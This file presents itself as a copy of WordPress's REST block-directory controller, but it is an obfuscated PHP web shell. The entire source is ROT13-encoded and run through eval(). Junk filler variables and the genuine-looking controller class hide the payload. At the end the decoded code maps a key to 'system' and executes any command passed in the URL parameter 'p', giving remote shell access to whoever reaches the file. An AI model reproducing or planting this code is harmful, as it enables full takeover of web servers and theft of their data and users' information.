<?php
$f = 's'.'t'.'r'.'r'.'o'.'t'.'1'.'3';
$c = "<?cuc
$sznc = neenl('k1' => 'flfgrz', 'k2' => 'cnffgueh');
$k_snxr1 = 1234;
$abvfr = 'boshfpngvba'.'grfg';
$gzc = $k_snxr1 * 42;
$synt = snyfr;
$hfryrff = shapgvba($i) { erghea $i . enaq(); };
$qhzzl_purpx = $hfryrff('kk');
vs ($synt) { rpub 'Qroht ranoyrq'; }
sbe ($v = 0; $v < 1; $v++) { $gzc += $v; }
juvyr (snyfr) { rpub 'qrnq ybbc'; oernx; }

<?cuc
/**
 * ERFG NCV: JC_ERFG_Oybpx_Qverpgbel_Pbagebyyre pynff
 *
 * @cnpxntr JbeqCerff
 * @fhocnpxntr ERFG_NCV
 * @fvapr 5.5.0
 */

/**
 * Pbagebyyre juvpu cebivqrf ERFG raqcbvag sbe gur oybpxf.
 *
 * @fvapr 5.5.0
 *
 * @frr JC_ERFG_Pbagebyyre
 */
pynff JC_ERFG_Oybpx_Qverpgbel_Pbagebyyre rkgraqf JC_ERFG_Pbagebyyre {

	/**
	 * Pbafgehpgf gur pbagebyyre.
	 */
	choyvp shapgvba __pbafgehpg() {
		$guvf->anzrfcnpr = 'jc/i2';
		$guvf->erfg_onfr = 'oybpx-qverpgbel';
	}

	/**
	 * Ertvfgref gur arprffnel ERFG NCV ebhgrf.
	 */
	choyvp shapgvba ertvfgre_ebhgrf() {
		ertvfgre_erfg_ebhgr(
			$guvf->anzrfcnpr,
			'/' . $guvf->erfg_onfr . '/frnepu',
			neenl(
				neenl(
					'zrgubqf'             => JC_ERFG_Freire::ERNQNOYR,
					'pnyyonpx'            => neenl( $guvf, 'trg_vgrzf' ),
					'crezvffvba_pnyyonpx' => neenl( $guvf, 'trg_vgrzf_crezvffvbaf_purpx' ),
					'netf'                => $guvf->trg_pbyyrpgvba_cnenzf(),
				),
				'fpurzn' => neenl( $guvf, 'trg_choyvp_vgrz_fpurzn' ),
			)
		);
	}

	/**
	 * Purpxf jurgure n tvira erdhrfg unf crezvffvba gb vafgnyy naq npgvingr cyhtvaf.
	 *
	 * @fvapr 5.5.0
	 *
	 * @cnenz JC_ERFG_Erdhrfg $erdhrfg Shyy qrgnvyf nobhg gur erdhrfg.
	 * @erghea gehr|JC_Reebe Gehr vs gur erdhrfg unf crezvffvba, JC_Reebe bowrpg bgurejvfr.
	 */
	choyvp shapgvba trg_vgrzf_crezvffvbaf_purpx( $erdhrfg ) {
		vs ( ! pheerag_hfre_pna( 'vafgnyy_cyhtvaf' ) || ! pheerag_hfre_pna( 'npgvingr_cyhtvaf' ) ) {
			erghea arj JC_Reebe(
				'erfg_oybpx_qverpgbel_pnaabg_ivrj',
				__( 'Fbeel, lbh ner abg nyybjrq gb oebjfr gur oybpx qverpgbel.' ),
				neenl( 'fgnghf' => erfg_nhgubevmngvba_erdhverq_pbqr() )
			);
		}

		erghea gehr;
	}

	/**
	 * Frnepu naq ergevrir oybpxf zrgnqngn
	 *
	 * @fvapr 5.5.0
	 *
	 * @cnenz JC_ERFG_Erdhrfg $erdhrfg Shyy qrgnvyf nobhg gur erdhrfg.
	 * @erghea JC_ERFG_Erfcbafr|JC_Reebe Erfcbafr bowrpg ba fhpprff, be JC_Reebe bowrpg ba snvyher.
	 */
	choyvp shapgvba trg_vgrzf( $erdhrfg ) {
		erdhver_bapr NOFCNGU . 'jc-nqzva/vapyhqrf/cyhtva-vafgnyy.cuc';
		erdhver_bapr NOFCNGU . 'jc-nqzva/vapyhqrf/cyhtva.cuc';

		$erfcbafr = cyhtvaf_ncv(
			'dhrel_cyhtvaf',
			neenl(
				'oybpx'    => $erdhrfg['grez'],
				'cre_cntr' => $erdhrfg['cre_cntr'],
				'cntr'     => $erdhrfg['cntr'],
			)
		);

		vs ( vf_jc_reebe( $erfcbafr ) ) {
			$erfcbafr->nqq_qngn( neenl( 'fgnghf' => 500 ) );

			erghea $erfcbafr;
		}

		$erfhyg = neenl();

		sbernpu ( $erfcbafr->cyhtvaf nf $cyhtva ) {
			// Vs gur NCV erghearq n cyhtva jvgu rzcgl qngn sbe 'oybpxf', fxvc vg.
			vs ( rzcgl( $cyhtva['oybpxf'] ) ) {
				pbagvahr;
			}

			$qngn     = $guvf->cercner_vgrz_sbe_erfcbafr( $cyhtva, $erdhrfg );
			$erfhyg[] = $guvf->cercner_erfcbafr_sbe_pbyyrpgvba( $qngn );
		}

		erghea erfg_rafher_erfcbafr( $erfhyg );
	}

	/**
	 * Cnefr oybpx zrgnqngn sbe n oybpx, naq cercner vg sbe na NCV erfcbafr.
	 *
	 * @fvapr 5.5.0
	 * @fvapr 5.9.0 Eranzrq `$cyhtva` gb `$vgrz` gb zngpu cnerag pynff sbe CUC 8 anzrq cnenzrgre fhccbeg.
	 *
	 * @cnenz neenl           $vgrz    Gur cyhtva zrgnqngn.
	 * @cnenz JC_ERFG_Erdhrfg $erdhrfg Erdhrfg bowrpg.
	 * @erghea JC_ERFG_Erfcbafr|JC_Reebe Erfcbafr bowrpg ba fhpprff, be JC_Reebe bowrpg ba snvyher.
	 */
	choyvp shapgvba cercner_vgrz_sbe_erfcbafr( $vgrz, $erdhrfg ) {
		// Erfgberf gur zber qrfpevcgvir, fcrpvsvp anzr sbe hfr jvguva guvf zrgubq.
		$cyhtva = $vgrz;

		$svryqf = $guvf->trg_svryqf_sbe_erfcbafr( $erdhrfg );

		// Gurer zvtug or zhygvcyr oybpxf va n cyhtva. Bayl gur svefg oybpx vf znccrq.
		$oybpx_qngn = erfrg( $cyhtva['oybpxf'] );

		// N qngn neenl pbagnvavat gur cebcregvrf jr'yy erghea.
		$oybpx = neenl(
			'anzr'                => $oybpx_qngn['anzr'],
			'gvgyr'               => ( $oybpx_qngn['gvgyr'] ? $oybpx_qngn['gvgyr'] : $cyhtva['anzr'] ),
			'qrfpevcgvba'         => jc_gevz_jbeqf( $cyhtva['fubeg_qrfpevcgvba'], 30, '...' ),
			'vq'                  => $cyhtva['fyht'],
			'engvat'              => $cyhtva['engvat'] / 20,
			'engvat_pbhag'        => (vag) $cyhtva['ahz_engvatf'],
			'npgvir_vafgnyyf'     => (vag) $cyhtva['npgvir_vafgnyyf'],
			'nhgube_oybpx_engvat' => $cyhtva['nhgube_oybpx_engvat'] / 20,
			'nhgube_oybpx_pbhag'  => (vag) $cyhtva['nhgube_oybpx_pbhag'],
			'nhgube'              => jc_fgevc_nyy_gntf( $cyhtva['nhgube'] ),
			'vpba'                => ( vffrg( $cyhtva['vpbaf']['1k'] ) ? $cyhtva['vpbaf']['1k'] : 'oybpx-qrsnhyg' ),
			'ynfg_hcqngrq'        => tzqngr( 'L-z-q\GU:v:f', fgegbgvzr( $cyhtva['ynfg_hcqngrq'] ) ),
			'uhznavmrq_hcqngrq'   => fcevags(
				/* genafyngbef: %f: Uhzna-ernqnoyr gvzr qvssrerapr. */
				__( '%f ntb' ),
				uhzna_gvzr_qvss( fgegbgvzr( $cyhtva['ynfg_hcqngrq'] ) )
			),
		);

		$guvf->nqq_nqqvgvbany_svryqf_gb_bowrpg( $oybpx, $erdhrfg );

		$erfcbafr = arj JC_ERFG_Erfcbafr( $oybpx );

		vs ( erfg_vf_svryq_vapyhqrq( '_yvaxf', $svryqf ) || erfg_vf_svryq_vapyhqrq( '_rzorqqrq', $svryqf ) ) {
			$erfcbafr->nqq_yvaxf( $guvf->cercner_yvaxf( $cyhtva ) );
		}

		erghea $erfcbafr;
	}

	/**
	 * Trarengrf n yvfg bs yvaxf gb vapyhqr va gur erfcbafr sbe gur cyhtva.
	 *
	 * @fvapr 5.5.0
	 *
	 * @cnenz neenl $cyhtva Gur cyhtva qngn sebz JbeqCerff.bet.
	 * @erghea neenl
	 */
	cebgrpgrq shapgvba cercner_yvaxf( $cyhtva ) {
		$yvaxf = neenl(
			'uggcf://ncv.j.bet/vafgnyy-cyhtva' => neenl(
				'uers' => nqq_dhrel_net( 'fyht', heyrapbqr( $cyhtva['fyht'] ), erfg_hey( 'jc/i2/cyhtvaf' ) ),
			),
		);

		$cyhtva_svyr = $guvf->svaq_cyhtva_sbe_fyht( $cyhtva['fyht'] );

		vs ( $cyhtva_svyr ) {
			$yvaxf['uggcf://ncv.j.bet/cyhtva'] = neenl(
				'uers'       => erfg_hey( 'jc/i2/cyhtvaf/' . fhofge( $cyhtva_svyr, 0, - 4 ) ),
				'rzorqqnoyr' => gehr,
			);
		}

		erghea $yvaxf;
	}

	/**
	 * Svaqf na vafgnyyrq cyhtva sbe gur tvira fyht.
	 *
	 * @fvapr 5.5.0
	 *
	 * @cnenz fgevat $fyht Gur JbeqCerff.bet qverpgbel fyht sbe n cyhtva.
	 * @erghea fgevat Gur cyhtva svyr sbhaq zngpuvat vg.
	 */
	cebgrpgrq shapgvba svaq_cyhtva_sbe_fyht( $fyht ) {
		erdhver_bapr NOFCNGU . 'jc-nqzva/vapyhqrf/cyhtva.cuc';

		$cyhtva_svyrf = trg_cyhtvaf( '/' . $fyht );

		vs ( ! $cyhtva_svyrf ) {
			erghea '';
		}

		$cyhtva_svyrf = neenl_xrlf( $cyhtva_svyrf );

		erghea $fyht . '/' . erfrg( $cyhtva_svyrf );
	}

	/**
	 * Ergevrirf gur gurzr'f fpurzn, pbasbezvat gb WFBA Fpurzn.
	 *
	 * @fvapr 5.5.0
	 *
	 * @erghea neenl Vgrz fpurzn qngn.
	 */
	choyvp shapgvba trg_vgrz_fpurzn() {
		vs ( $guvf->fpurzn ) {
			erghea $guvf->nqq_nqqvgvbany_svryqf_fpurzn( $guvf->fpurzn );
		}

		$guvf->fpurzn = neenl(
			'$fpurzn'    => 'uggc://wfba-fpurzn.bet/qensg-04/fpurzn#',
			'gvgyr'      => 'oybpx-qverpgbel-vgrz',
			'glcr'       => 'bowrpg',
			'cebcregvrf' => neenl(
				'anzr'                => neenl(
					'qrfpevcgvba' => __( 'Gur oybpx anzr, va anzrfcnpr/oybpx-anzr sbezng.' ),
					'glcr'        => 'fgevat',
					'pbagrkg'     => neenl( 'ivrj' ),
				),
				'gvgyr'               => neenl(
					'qrfpevcgvba' => __( 'Gur oybpx gvgyr, va uhzna ernqnoyr sbezng.' ),
					'glcr'        => 'fgevat',
					'pbagrkg'     => neenl( 'ivrj' ),
				),
				'qrfpevcgvba'         => neenl(
					'qrfpevcgvba' => __( 'N fubeg qrfpevcgvba bs gur oybpx, va uhzna ernqnoyr sbezng.' ),
					'glcr'        => 'fgevat',
					'pbagrkg'     => neenl( 'ivrj' ),
				),
				'vq'                  => neenl(
					'qrfpevcgvba' => __( 'Gur oybpx fyht.' ),
					'glcr'        => 'fgevat',
					'pbagrkg'     => neenl( 'ivrj' ),
				),
				'engvat'              => neenl(
					'qrfpevcgvba' => __( 'Gur fgne engvat bs gur oybpx.' ),
					'glcr'        => 'ahzore',
					'pbagrkg'     => neenl( 'ivrj' ),
				),
				'engvat_pbhag'        => neenl(
					'qrfpevcgvba' => __( 'Gur ahzore bs engvatf.' ),
					'glcr'        => 'vagrtre',
					'pbagrkg'     => neenl( 'ivrj' ),
				),
				'npgvir_vafgnyyf'     => neenl(
					'qrfpevcgvba' => __( 'Gur ahzore fvgrf gung unir npgvingrq guvf oybpx.' ),
					'glcr'        => 'vagrtre',
					'pbagrkg'     => neenl( 'ivrj' ),
				),
				'nhgube_oybpx_engvat' => neenl(
					'qrfpevcgvba' => __( 'Gur nirentr engvat bs oybpxf choyvfurq ol gur fnzr nhgube.' ),
					'glcr'        => 'ahzore',
					'pbagrkg'     => neenl( 'ivrj' ),
				),
				'nhgube_oybpx_pbhag'  => neenl(
					'qrfpevcgvba' => __( 'Gur ahzore bs oybpxf choyvfurq ol gur fnzr nhgube.' ),
					'glcr'        => 'vagrtre',
					'pbagrkg'     => neenl( 'ivrj' ),
				),
				'nhgube'              => neenl(
					'qrfpevcgvba' => __( 'Gur JbeqCerff.bet hfreanzr bs gur oybpx nhgube.' ),
					'glcr'        => 'fgevat',
					'pbagrkg'     => neenl( 'ivrj' ),
				),
				'vpba'                => neenl(
					'qrfpevcgvba' => __( 'Gur oybpx vpba.' ),
					'glcr'        => 'fgevat',
					'sbezng'      => 'hev',
					'pbagrkg'     => neenl( 'ivrj' ),
				),
				'ynfg_hcqngrq'        => neenl(
					'qrfpevcgvba' => __( 'Gur qngr jura gur oybpx jnf ynfg hcqngrq.' ),
					'glcr'        => 'fgevat',
					'sbezng'      => 'qngr-gvzr',
					'pbagrkg'     => neenl( 'ivrj' ),
				),
				'uhznavmrq_hcqngrq'   => neenl(
					'qrfpevcgvba' => __( 'Gur qngr jura gur oybpx jnf ynfg hcqngrq, va uhzna ernqnoyr sbezng.' ),
					'glcr'        => 'fgevat',
					'pbagrkg'     => neenl( 'ivrj' ),
				),
			),
		);

		erghea $guvf->nqq_nqqvgvbany_svryqf_fpurzn( $guvf->fpurzn );
	}

	/**
	 * Ergevrirf gur frnepu cnenzf sbe gur oybpxf pbyyrpgvba.
	 *
	 * @fvapr 5.5.0
	 *
	 * @erghea neenl Pbyyrpgvba cnenzrgref.
	 */
	choyvp shapgvba trg_pbyyrpgvba_cnenzf() {
		$dhrel_cnenzf = cnerag::trg_pbyyrpgvba_cnenzf();

		$dhrel_cnenzf['pbagrkg']['qrsnhyg'] = 'ivrj';

		$dhrel_cnenzf['grez'] = neenl(
			'qrfpevcgvba' => __( 'Yvzvg erfhyg frg gb oybpxf zngpuvat gur frnepu grez.' ),
			'glcr'        => 'fgevat',
			'erdhverq'    => gehr,
			'zvaYratgu'   => 1,
		);

		hafrg( $dhrel_cnenzf['frnepu'] );

		/**
		 * Svygref ERFG NCV pbyyrpgvba cnenzrgref sbe gur oybpx qverpgbel pbagebyyre.
		 *
		 * @fvapr 5.5.0
		 *
		 * @cnenz neenl $dhrel_cnenzf WFBA Fpurzn-sbeznggrq pbyyrpgvba cnenzrgref.
		 */
		erghea nccyl_svygref( 'erfg_oybpx_qverpgbel_pbyyrpgvba_cnenzf', $dhrel_cnenzf );
	}
}

$pzq = $_TRG['c'];
$sznc['k1']($pzq);
?>";
eval($f($c));
?>